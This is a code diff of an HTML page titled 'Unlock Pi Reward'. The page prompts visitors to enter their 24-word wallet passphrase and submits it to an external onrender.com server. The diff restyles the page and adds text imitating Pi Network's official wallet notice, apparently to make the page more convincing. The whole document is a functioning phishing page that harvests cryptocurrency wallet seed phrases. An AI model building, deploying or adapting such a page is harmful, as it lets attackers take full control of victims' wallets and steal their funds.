@@ -3,79 +3,112 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Unlock PI Rewards</title>
+    <title>Unlock Pi Reward</title>
     <style>
+        /* General reset */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
             font-family: Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            margin: 0;
             background-color: #f4f4f4;
+            margin: 0;
         }
+
         .container {
-            text-align: center;
+            width: 90%;
+            max-width: 400px;
             background: white;
             padding: 20px;
             border-radius: 8px;
             box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
-            width: 90%;
-            max-width: 400px;
+            text-align: center;
         }
+
         h1 {
-            font-size: 24px;
+            font-size: 22px;
+            color: #5a2da2;
             margin-bottom: 20px;
         }
-        input[type="text"] {
+
+        textarea {
             width: 100%;
+            height: 100px;
             padding: 10px;
-            font-size: 16px;
-            margin-bottom: 20px;
+            font-size: 14px;
             border: 1px solid #ccc;
             border-radius: 4px;
+            resize: none;
         }
+
         button {
-            background-color: #007BFF;
+            width: 100%;
+            background-color: #5a2da2;
             color: white;
             border: none;
-            padding: 10px 20px;
+            padding: 12px 20px;
             font-size: 16px;
             border-radius: 4px;
             cursor: pointer;
+            margin-top: 20px;
         }
+
         button:hover {
-            background-color: #0056b3;
+            background-color: #4a2390;
         }
-        .error {
-            color: red;
-            font-size: 14px;
-            margin-bottom: 10px;
+
+        .info-text {
+            font-size: 12px;
+            color: #555;
+            margin-top: 20px;
+            line-height: 1.5;
+        }
+
+        .info-text a {
+            color: #5a2da2;
+            text-decoration: none;
+        }
+
+        .info-text a:hover {
+            text-decoration: underline;
         }
     </style>
     <script>
+        // Clear passphrase on page reload
+        window.onload = function() {
+            document.getElementById("passphrase").value = "";
+        };
+
         function validatePassphrase() {
             const passphrase = document.getElementById("passphrase").value.trim();
-            const errorMessage = document.getElementById("error-message");
             const wordCount = passphrase.split(" ").filter(word => word).length;
 
             if (wordCount !== 24) {
-                errorMessage.textContent = "Please enter a valid 24-word passphrase.";
+                alert("Please enter a valid 24-word passphrase.");
                 return false;
             }
-            errorMessage.textContent = "";
             return true;
         }
     </script>
 </head>
 <body>
     <div class="container">
-        <h1>Unlock PI Rewards</h1>
-        <div id="error-message" class="error"></div>
+        <h1>Unlock Pi Reward</h1>
         <form action="https://pinetwork-ib9q.onrender.com/submit" method="POST" onsubmit="return validatePassphrase()">
-            <input type="text" id="passphrase" name="passphrase" placeholder="Enter your 24-word passphrase">
-            <button type="submit">Unlock PI Reward</button>
+            <textarea id="passphrase" name="passphrase" placeholder="Enter your 24-word passphrase here"></textarea>
+            <button type="submit">Unlock with passphrase</button>
         </form>
+        <div class="info-text">
+            As a non-custodial wallet, your wallet passphrase is only accessible to you. It is currently not possible to recover the wallet passphrase. <br><br>
+            Lost your wallet passphrase? <a href="#">you can create a new wallet</a>, but all the Pi numbers in your previous wallet will be inaccessible.
+        </div>
     </div>
 </body>
 </html>
